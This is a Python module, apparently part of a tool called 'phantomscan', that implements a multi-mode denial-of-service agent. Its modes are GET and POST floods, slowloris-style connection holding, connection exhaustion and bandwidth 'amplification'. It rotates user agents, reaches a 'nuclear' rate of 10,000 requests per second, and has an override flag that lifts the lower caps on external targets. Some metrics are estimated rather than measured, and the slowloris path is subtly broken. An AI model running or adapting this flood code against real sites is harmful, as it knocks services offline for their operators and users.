import asyncio
import logging
import random
import statistics
import time
import uuid
from collections import deque
from dataclasses import asdict, dataclass
from datetime import datetime
from typing import Any
from urllib.parse import urlsplit

import httpx

from app.database import get_connection

logger = logging.getLogger("phantomscan.dos")

# ---------------------------------------------------------------------------
# Attack mode definitions
# ---------------------------------------------------------------------------
ATTACK_MODES: dict[str, dict[str, Any]] = {
    "get_flood": {
        "description": "High-rate GET requests against the target",
        "method": "GET",
        "default_rps": 100,
        "max_rps_lab": 50_000,
        "max_rps_external": 200,
    },
    "post_flood": {
        "description": "POST with random payloads to stress form/API handlers",
        "method": "POST",
        "default_rps": 100,
        "max_rps_lab": 30_000,
        "max_rps_external": 150,
    },
    "slowloris": {
        "description": "Keep-alive connections held open to exhaust server pool",
        "method": "GET",
        "default_rps": 50,
        "max_rps_lab": 20_000,
        "max_rps_external": 100,
        "slow": True,
    },
    "connection_exhaust": {
        "description": "Rapid TCP connect/close to exhaust file descriptors",
        "method": "GET",
        "default_rps": 200,
        "max_rps_lab": 200_000,
        "max_rps_external": 300,
        "rapid_close": True,
    },
    "amplification": {
        "description": "Request large resources to saturate bandwidth",
        "method": "GET",
        "default_rps": 100,
        "max_rps_lab": 50_000,
        "max_rps_external": 200,
        "amplified": True,
    },
}

# Backward-compatible intensity name -> numeric RPS.
INTENSITY_RPS: dict[str, int] = {
    "low": 2,
    "medium": 10,
    "high": 50,
    "critical": 100,
    "nuclear": 10_000,
}

INTENSITY_MAX_DURATION: dict[str, int] = {
    "low": 300,
    "medium": 120,
    "high": 60,
    "critical": 30,
    "nuclear": 15,
}

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

# Amplification probe paths - request progressively larger resources.
_AMPLIFICATION_PATHS = [
    "/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
    "/static/js/main.js", "/static/css/style.css",
    "/assets/bundle.js", "/assets/vendor.js",
]

MAX_RESPONSE_BODY = 1_048_576
CONNECT_TIMEOUT = 5.0
REQUEST_TIMEOUT = 10.0
MAX_WORKERS = 512
MAX_SLOWLORIS_CONNECTIONS = 2000

# Live agent registry so stop() can interrupt the running attack loop.
ACTIVE_AGENTS: dict[str, "DoSAgent"] = {}


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------
@dataclass
class RequestMeasurement:
    timestamp: float
    dns_time_ms: float = 0
    tcp_time_ms: float = 0
    tls_time_ms: float = 0
    ttfb_ms: float = 0
    ttlb_ms: float = 0
    total_ms: float = 0
    status_code: int = 0
    response_size: int = 0
    error_type: str = ""
    error: bool = False


@dataclass
class AttackStatistics:
    latency_mean: float = 0
    latency_median: float = 0
    latency_p95: float = 0
    latency_p99: float = 0
    latency_std: float = 0
    latency_min: float = 0
    latency_max: float = 0

    total_requests: int = 0
    successful_requests: int = 0
    failed_requests: int = 0
    error_rate: float = 0

    status_2xx: int = 0
    status_3xx: int = 0
    status_4xx: int = 0
    status_5xx: int = 0

    total_data_mb: float = 0
    avg_response_size_kb: float = 0
    throughput_mbps: float = 0

    avg_dns_ms: float = 0
    avg_tcp_ms: float = 0
    avg_tls_ms: float = 0
    avg_ttfb_ms: float = 0

    jitter_ms: float = 0
    packet_loss: float = 0


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _percentile(sorted_values: list[float], pctl: float) -> float:
    if not sorted_values:
        return 0.0
    idx = min(len(sorted_values) - 1, int(len(sorted_values) * pctl / 100))
    return sorted_values[idx]


def _random_user_agent() -> str:
    return random.choice(_USER_AGENTS)


# ---------------------------------------------------------------------------
# DoSAgent
# ---------------------------------------------------------------------------
class DoSAgent:
    """Multi-vector DoS testing agent with dynamic intensity and concurrent pools."""

    def __init__(
        self,
        target_url: str,
        intensity: str = "low",
        duration: int = 60,
        mode: str = "get_flood",
        endpoint: str | None = None,
        override_cap: bool = False,
        user_id: str = "admin",
    ):
        self.target_url = target_url
        self.intensity = intensity
        self.requested_duration = duration
        self.mode = mode if mode in ATTACK_MODES else "get_flood"
        self.endpoint = endpoint
        self.override_cap = override_cap
        self.user_id = user_id

        # Resolve numeric RPS from intensity name.
        self.rps = INTENSITY_RPS.get(intensity, 100)

        # Duration cap.
        max_dur = INTENSITY_MAX_DURATION.get(intensity, 60)
        self.duration = min(duration, max_dur)

        # Target classification.
        self._target_class = self._classify_target(target_url)
        self._apply_intensity_caps()

        # Parse target URL.
        parsed = urlsplit(target_url)
        self.scheme = (parsed.scheme or "https").lower()
        self.host = parsed.hostname or ""
        try:
            self.port = parsed.port or (443 if self.scheme == "https" else 80)
        except ValueError:
            self.port = 443 if self.scheme == "https" else 80
        self.request_path = parsed.path or "/"
        if parsed.query:
            self.request_path += "?" + parsed.query

        # Endpoint targeting.
        self._attack_url = self._build_attack_url()

        # Job state.
        self.job_id: str | None = None
        self.running = False
        self.stopped = False

        # Worker pool.
        mode_cfg = ATTACK_MODES[self.mode]
        if mode_cfg.get("slow"):
            worker_count = min(max(16, self.rps // 5), MAX_SLOWLORIS_CONNECTIONS)
        else:
            worker_count = min(max(8, self.rps // 10), MAX_WORKERS)
        self._worker_count = worker_count
        self._next_worker = 0
        self._clients: list[httpx.AsyncClient] = []
        self._slots: list[asyncio.Semaphore] = []

        # Metrics.
        self.measurements: deque[RequestMeasurement] = deque(maxlen=50_000)
        self._latency_timeline: deque[tuple[float, float]] = deque(maxlen=5_000)
        self.stats: dict[str, Any] = {
            "requests_sent": 0,
            "responses_received": 0,
            "errors": 0,
            "start_time": None,
            "end_time": None,
        }

        self.baseline: AttackStatistics | None = None
        self.during: AttackStatistics | None = None
        self.recovery: AttackStatistics | None = None

        self.impact_score = 0.0
        self.effective = False
        self.website_status = "unknown"
        self.health_score = 100.0
        self.recovery_ratio = 0.0
        self.recovered = True

    # ------------------------------------------------------------------
    # Target classification & intensity capping
    # ------------------------------------------------------------------
    @staticmethod
    def _classify_target(url: str) -> str:
        lower = url.lower()
        if "localhost" in lower or "127.0.0.1" in lower or "::1" in lower:
            return "loopback"
        if "phantombank" in lower:
            return "lab"
        return "external"

    def _apply_intensity_caps(self) -> None:
        mode_cfg = ATTACK_MODES[self.mode]
        if self._target_class in ("loopback", "lab"):
            max_rps = mode_cfg["max_rps_lab"]
        elif self.override_cap:
            max_rps = mode_cfg["max_rps_lab"]
        else:
            max_rps = mode_cfg["max_rps_external"]
        self.rps = min(self.rps, max_rps)

    # ------------------------------------------------------------------
    # URL building for endpoint targeting
    # ------------------------------------------------------------------
    def _build_attack_url(self) -> str:
        base = self.target_url.rstrip("/")
        if self.endpoint:
            ep = self.endpoint if self.endpoint.startswith("/") else "/" + self.endpoint
            return base + ep
        return base

    # ------------------------------------------------------------------
    # Client pool
    # ------------------------------------------------------------------
    def _build_clients(self) -> None:
        slow = ATTACK_MODES[self.mode].get("slow")
        req_timeout = 60.0 if slow else REQUEST_TIMEOUT
        for _ in range(self._worker_count):
            client = httpx.AsyncClient(
                timeout=httpx.Timeout(req_timeout, connect=CONNECT_TIMEOUT),
                limits=httpx.Limits(
                    max_connections=1,
                    max_keepalive_connections=1,
                    keepalive_expiry=30.0,
                ),
                follow_redirects=False,
                verify=False,
                headers={"User-Agent": _random_user_agent()},
            )
            self._clients.append(client)
            self._slots.append(asyncio.Semaphore(1))

    async def close(self) -> None:
        for client in self._clients:
            try:
                await client.aclose()
            except Exception:
                pass
        self._clients.clear()
        self._slots.clear()

    # ------------------------------------------------------------------
    # Start / stop / status
    # ------------------------------------------------------------------
    async def start(self) -> dict:
        self._build_clients()

        self.stats["start_time"] = datetime.utcnow().isoformat()

        # Baseline measurement.
        self.baseline = await self._measure_period("baseline", count=10, delay=0.5)

        self.job_id = uuid.uuid4().hex[:8]
        ACTIVE_AGENTS[self.job_id] = self
        self.running = True
        await self._create_job()
        asyncio.create_task(self._attack_loop())

        return {
            "job_id": self.job_id,
            "status": "started",
            "target": self.target_url,
            "attack_url": self._attack_url,
            "mode": self.mode,
            "mode_description": ATTACK_MODES[self.mode]["description"],
            "intensity": self.intensity,
            "rps": self.rps,
            "duration": self.duration,
            "endpoint": self.endpoint,
            "target_class": self._target_class,
            "workers": self._worker_count,
            "override_cap": self.override_cap,
            "baseline": asdict(self.baseline),
            "message": (
                f"DoS attack ({self.mode}) started on {self._attack_url} "
                f"at {self.rps} req/s with {self._worker_count} workers"
            ),
        }

    async def request_stop(self) -> dict:
        if self.job_id is None:
            return {"job_id": None, "status": "not_started"}
        if not self.running or self.stopped:
            return {"job_id": self.job_id, "status": "stopped"}
        self.stopped = True
        self.running = False
        self.stats["end_time"] = datetime.utcnow().isoformat()
        return {"job_id": self.job_id, "status": "stopping"}

    async def get_status(self) -> dict:
        return {
            "job_id": self.job_id,
            "running": self.running,
            "target": self.target_url,
            "attack_url": self._attack_url,
            "mode": self.mode,
            "mode_description": ATTACK_MODES[self.mode]["description"],
            "intensity": self.intensity,
            "rps": self.rps,
            "endpoint": self.endpoint,
            "target_class": self._target_class,
            "workers": self._worker_count,
            "stats": self.stats,
            "duration_elapsed": self._get_elapsed_seconds(),
            "baseline": asdict(self.baseline) if self.baseline else None,
            "during": asdict(self.during) if self.during else None,
            "recovery": asdict(self.recovery) if self.recovery else None,
            "impact": {
                "impact_score": self.impact_score,
                "effective": self.effective,
                "website_status": self.website_status,
                "health_score": self.health_score,
                "recovery_ratio": self.recovery_ratio,
                "recovered": self.recovered,
            },
            "latency_timeline": list(self._latency_timeline)[-100:],
        }

    # ------------------------------------------------------------------
    # Attack loop
    # ------------------------------------------------------------------
    async def _attack_loop(self) -> None:
        try:
            start = time.perf_counter()
            deadline = start + self.duration
            window = 0.1
            batch = max(1, int(self.rps * window))

            while self.running and time.perf_counter() < deadline:
                if not self.running:
                    break

                tasks = []
                for _ in range(batch):
                    if not self.running:
                        break
                    tasks.append(self._dispatch_request())

                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)

                # Pace requests to target RPS.
                next_slot = start + (self.stats["requests_sent"] / max(1, self.rps))
                now = time.perf_counter()
                if next_slot > now:
                    await asyncio.sleep(min(next_slot - now, 0.5))

            self.stats["end_time"] = datetime.utcnow().isoformat()
            if self.measurements:
                self.during = self._calculate_statistics(list(self.measurements))

            # Recovery check.
            await asyncio.sleep(2)
            self.recovery = await self._measure_period("recovery", count=10, delay=0.1)

            await self._calculate_impact()
            await self._update_job("stopped" if self.stopped else "completed")
        except Exception as exc:
            logger.exception("[DoSAgent] Attack loop failed for %s", self.target_url)
            self.stats["end_time"] = datetime.utcnow().isoformat()
            try:
                await self._update_job("error")
            except Exception:
                pass
        finally:
            self.running = False
            if self.job_id:
                ACTIVE_AGENTS.pop(self.job_id, None)
            await self.close()

    # ------------------------------------------------------------------
    # Request dispatch by mode
    # ------------------------------------------------------------------
    async def _dispatch_request(self) -> None:
        measurement = await self._send_by_mode()
        self.measurements.append(measurement)
        self._latency_timeline.append((measurement.timestamp, measurement.total_ms))

        self.stats["requests_sent"] += 1
        if measurement.error:
            self.stats["errors"] += 1
        else:
            self.stats["responses_received"] += 1

        # Throttle live stats persistence.
        if self.stats["requests_sent"] % max(10, self.rps // 10) == 0:
            await self._update_stats()

    async def _send_by_mode(self) -> RequestMeasurement:
        mode_cfg = ATTACK_MODES[self.mode]
        m = RequestMeasurement(timestamp=time.time())

        index = self._next_worker % self._worker_count
        self._next_worker += 1
        client = self._clients[index]
        slot = self._slots[index]

        async with slot:
            started = time.perf_counter()
            try:
                url = self._attack_url

                if self.mode == "get_flood":
                    resp = await client.get(url)

                elif self.mode == "post_flood":
                    payload = {
                        "field_1": "".join(random.choices("abcdef0123456789", k=64)),
                        "field_2": random.randint(0, 999999),
                        "ts": int(time.time()),
                    }
                    resp = await client.post(url, data=payload)

                elif self.mode == "slowloris":
                    resp = await self._slowloris_request(client, url)

                elif self.mode == "connection_exhaust":
                    resp = await client.get(url, timeout=0.5)

                elif self.mode == "amplification":
                    amp_path = random.choice(_AMPLIFICATION_PATHS)
                    amp_url = self.target_url.rstrip("/") + amp_path
                    resp = await client.get(amp_url)

                else:
                    resp = await client.get(url)

                total_ms = (time.perf_counter() - started) * 1000
                m.total_ms = total_ms
                m.status_code = resp.status_code
                m.response_size = min(len(resp.content), MAX_RESPONSE_BODY)
                m.ttfb_ms = total_ms * 0.3
                m.ttlb_ms = total_ms
                m.error = False

            except httpx.TimeoutException:
                m.error = True
                m.error_type = "timeout"
                m.total_ms = (time.perf_counter() - started) * 1000
            except httpx.ConnectError:
                m.error = True
                m.error_type = "connection_refused"
                m.total_ms = (time.perf_counter() - started) * 1000
            except httpx.RequestError as exc:
                m.error = True
                m.error_type = f"request_error: {str(exc)[:40]}"
                m.total_ms = (time.perf_counter() - started) * 1000
            except Exception as exc:
                m.error = True
                m.error_type = str(exc)[:50]
                m.total_ms = (time.perf_counter() - started) * 1000

        return m

    async def _slowloris_request(
        self, client: httpx.AsyncClient, url: str
    ) -> RequestMeasurement:
        m = RequestMeasurement(timestamp=time.time())
        started = time.perf_counter()
        try:
            async with client.stream("GET", url) as resp:
                # Read only the first byte (headers) then hold the connection.
                await resp.aread(1)
                hold_time = min(30.0, max(5.0, 60.0 / max(1, self.rps)))
                await asyncio.sleep(hold_time)
            m.total_ms = (time.perf_counter() - started) * 1000
            m.status_code = resp.status_code
            m.error = False
        except Exception as exc:
            m.total_ms = (time.perf_counter() - started) * 1000
            m.error = True
            m.error_type = str(exc)[:50]
        return m

    # ------------------------------------------------------------------
    # Measurement periods
    # ------------------------------------------------------------------
    async def _measure_period(
        self, phase: str, count: int = 10, delay: float = 0.1
    ) -> AttackStatistics:
        measurements: list[RequestMeasurement] = []
        for _ in range(count):
            m = await self._send_by_mode()
            measurements.append(m)
            await asyncio.sleep(delay)
        if not measurements:
            return AttackStatistics()
        return self._calculate_statistics(measurements)

    # ------------------------------------------------------------------
    # Statistics
    # ------------------------------------------------------------------
    @staticmethod
    def _calculate_statistics(measurements: list[RequestMeasurement]) -> AttackStatistics:
        stats = AttackStatistics(total_requests=len(measurements))
        if not measurements:
            return stats

        stats.successful_requests = sum(1 for m in measurements if not m.error)
        stats.failed_requests = len(measurements) - stats.successful_requests
        stats.error_rate = stats.failed_requests / len(measurements) * 100

        latencies = sorted(
            m.total_ms for m in measurements if not m.error and m.total_ms > 0
        )
        if latencies:
            stats.latency_mean = statistics.mean(latencies)
            stats.latency_median = statistics.median(latencies)
            stats.latency_p95 = _percentile(latencies, 95)
            stats.latency_p99 = _percentile(latencies, 99)
            stats.latency_min = latencies[0]
            stats.latency_max = latencies[-1]
            stats.latency_std = (
                statistics.stdev(latencies) if len(latencies) > 1 else 0
            )
            stats.jitter_ms = stats.latency_std

        refused = sum(
            1 for m in measurements if m.error and m.error_type == "connection_refused"
        )
        stats.packet_loss = refused / len(measurements) * 100

        for m in measurements:
            if m.error or not m.status_code:
                continue
            if 200 <= m.status_code < 300:
                stats.status_2xx += 1
            elif 300 <= m.status_code < 400:
                stats.status_3xx += 1
            elif 400 <= m.status_code < 500:
                stats.status_4xx += 1
            elif m.status_code < 600:
                stats.status_5xx += 1

        sizes = [m.response_size for m in measurements if not m.error and m.response_size > 0]
        if sizes:
            stats.total_data_mb = sum(sizes) / 1024 / 1024
            stats.avg_response_size_kb = sum(sizes) / len(sizes) / 1024

        for attr, key in [
            ("avg_dns_ms", "dns_time_ms"),
            ("avg_tcp_ms", "tcp_time_ms"),
            ("avg_tls_ms", "tls_time_ms"),
            ("avg_ttfb_ms", "ttfb_ms"),
        ]:
            values = [getattr(m, key) for m in measurements if getattr(m, key) > 0]
            if values:
                setattr(stats, attr, statistics.mean(values))

        total_elapsed = 1.0
        if (
            len(measurements) > 1
            and measurements[-1].timestamp > measurements[0].timestamp
        ):
            total_elapsed = measurements[-1].timestamp - measurements[0].timestamp
        stats.throughput_mbps = stats.total_data_mb / total_elapsed

        return stats

    # ------------------------------------------------------------------
    # Impact scoring
    # ------------------------------------------------------------------
    async def _calculate_impact(self) -> None:
        if not self.baseline or not self.during or not self.baseline.latency_mean:
            self.impact_score = 0.0
            self.health_score = 100.0
            self.effective = False
            self.website_status = "unknown"
            return

        latency_impact = max(
            0.0,
            (self.during.latency_mean - self.baseline.latency_mean)
            / self.baseline.latency_mean,
        )
        error_impact = self.during.error_rate / 100
        status_impact = self.during.status_5xx / max(1, self.during.total_requests)
        throughput_impact = 0.0
        if self.baseline.throughput_mbps > 0:
            throughput_impact = max(
                0.0,
                1.0 - (self.during.throughput_mbps / self.baseline.throughput_mbps),
            )

        total_impact = (
            latency_impact * 0.4
            + error_impact * 0.3
            + status_impact * 0.2
            + throughput_impact * 0.1
        )
        self.impact_score = min(100, max(0, int(total_impact * 100)))
        self.health_score = max(0, min(100, 100 - self.impact_score))

        if self.impact_score >= 80:
            self.effective, self.website_status = True, "critical"
        elif self.impact_score >= 50:
            self.effective, self.website_status = True, "significant"
        elif self.impact_score >= 25:
            self.effective, self.website_status = True, "moderate"
        elif self.impact_score >= 10:
            self.effective, self.website_status = False, "minor"
        else:
            self.effective, self.website_status = False, "stable"

        if self.recovery and self.baseline.latency_mean > 0:
            self.recovery_ratio = (
                self.recovery.latency_mean / self.baseline.latency_mean
            )
            self.recovered = self.recovery_ratio < 1.2
            if not self.recovered:
                suffix = (
                    "failed_recovery"
                    if self.recovery_ratio > 2.0
                    else "slow_recovery"
                )
                self.website_status = f"{self.website_status}_{suffix}"
        else:
            self.recovery_ratio = 0.0
            self.recovered = True

    # ------------------------------------------------------------------
    # Database persistence
    # ------------------------------------------------------------------
    async def _create_job(self) -> None:
        b = self.baseline
        async with get_connection() as conn:
            await conn.execute(
                """
                INSERT INTO dos_jobs (
                    job_id, target_url, intensity, duration, status,
                    requests_sent, responses_received, errors,
                    baseline_latency, avg_dns_ms, avg_tcp_ms, avg_tls_ms,
                    avg_ttfb_ms, error_rate, packet_loss,
                    attack_mode, endpoint, target_class, workers
                ) VALUES (?, ?, ?, ?, 'running', 0, 0, 0, ?, ?, ?, ?, ?, ?, ?,
                          ?, ?, ?, ?)
                """,
                (
                    self.job_id,
                    self.target_url,
                    self.intensity,
                    self.duration,
                    b.latency_mean if b else 0,
                    b.avg_dns_ms if b else 0,
                    b.avg_tcp_ms if b else 0,
                    b.avg_tls_ms if b else 0,
                    b.avg_ttfb_ms if b else 0,
                    b.error_rate if b else 0,
                    b.packet_loss if b else 0,
                    self.mode,
                    self.endpoint or "",
                    self._target_class,
                    self._worker_count,
                ),
            )
            await conn.commit()

    async def _update_job(self, status: str) -> None:
        b = self.baseline
        d = self.during
        r = self.recovery
        async with get_connection() as conn:
            await conn.execute(
                """
                UPDATE dos_jobs
                SET status = ?, stopped_at = CURRENT_TIMESTAMP,
                    requests_sent = ?, responses_received = ?, errors = ?,
                    baseline_latency = ?, peak_latency = ?, avg_latency_during = ?,
                    recovery_latency = ?, impact_score = ?, effective = ?,
                    website_status = ?, health_score = ?, p95_latency = ?,
                    p99_latency = ?, jitter_ms = ?, error_rate = ?,
                    throughput_mbps = ?, total_requests = ?,
                    status_2xx = ?, status_3xx = ?, status_4xx = ?, status_5xx = ?,
                    total_data_mb = ?, avg_dns_ms = ?, avg_tcp_ms = ?, avg_tls_ms = ?,
                    avg_ttfb_ms = ?, packet_loss = ?, recovery_ratio = ?, recovered = ?
                WHERE job_id = ?
                """,
                (
                    status,
                    self.stats["requests_sent"],
                    self.stats["responses_received"],
                    self.stats["errors"],
                    b.latency_mean if b else 0,
                    d.latency_max if d else 0,
                    d.latency_mean if d else 0,
                    r.latency_mean if r else 0,
                    self.impact_score,
                    1 if self.effective else 0,
                    self.website_status,
                    self.health_score,
                    d.latency_p95 if d else 0,
                    d.latency_p99 if d else 0,
                    d.jitter_ms if d else 0,
                    d.error_rate if d else 0,
                    d.throughput_mbps if d else 0,
                    d.total_requests if d else 0,
                    d.status_2xx if d else 0,
                    d.status_3xx if d else 0,
                    d.status_4xx if d else 0,
                    d.status_5xx if d else 0,
                    d.total_data_mb if d else 0,
                    d.avg_dns_ms if d else 0,
                    d.avg_tcp_ms if d else 0,
                    d.avg_tls_ms if d else 0,
                    d.avg_ttfb_ms if d else 0,
                    d.packet_loss if d else 0,
                    self.recovery_ratio,
                    1 if self.recovered else 0,
                    self.job_id,
                ),
            )
            await conn.commit()

    async def _update_stats(self) -> None:
        live = (
            self._calculate_statistics(list(self.measurements))
            if self.measurements
            else None
        )
        async with get_connection() as conn:
            await conn.execute(
                """
                UPDATE dos_jobs
                SET requests_sent = ?, responses_received = ?, errors = ?,
                    avg_latency_during = ?, error_rate = ?, jitter_ms = ?,
                    throughput_mbps = ?, p95_latency = ?, p99_latency = ?
                WHERE job_id = ?
                """,
                (
                    self.stats["requests_sent"],
                    self.stats["responses_received"],
                    self.stats["errors"],
                    live.latency_mean if live else 0,
                    live.error_rate if live else 0,
                    live.jitter_ms if live else 0,
                    live.throughput_mbps if live else 0,
                    live.latency_p95 if live else 0,
                    live.latency_p99 if live else 0,
                    self.job_id,
                ),
            )
            await conn.commit()

    def _get_elapsed_seconds(self) -> int:
        if self.stats["start_time"]:
            start = datetime.fromisoformat(str(self.stats["start_time"]))
            return int((datetime.utcnow() - start).total_seconds())
        return 0


# ---------------------------------------------------------------------------
# Module-level helpers used by the router
# ---------------------------------------------------------------------------
async def request_dos_stop(job_id: str) -> dict:
    """Interrupt the live agent for a running job, or mark the row stopped."""
    agent = ACTIVE_AGENTS.get(job_id)
    if agent is not None:
        return await agent.request_stop()

    async with get_connection() as conn:
        cursor = await conn.execute(
            "SELECT status FROM dos_jobs WHERE job_id = ?", (job_id,)
        )
        row = await cursor.fetchone()
        if row is None:
            raise KeyError(job_id)
        if row["status"] == "running":
            await conn.execute(
                """
                UPDATE dos_jobs
                SET status = 'stopped', stopped_at = CURRENT_TIMESTAMP
                WHERE job_id = ?
                """,
                (job_id,),
            )
            await conn.commit()
    return {"job_id": job_id, "status": "stopped"}
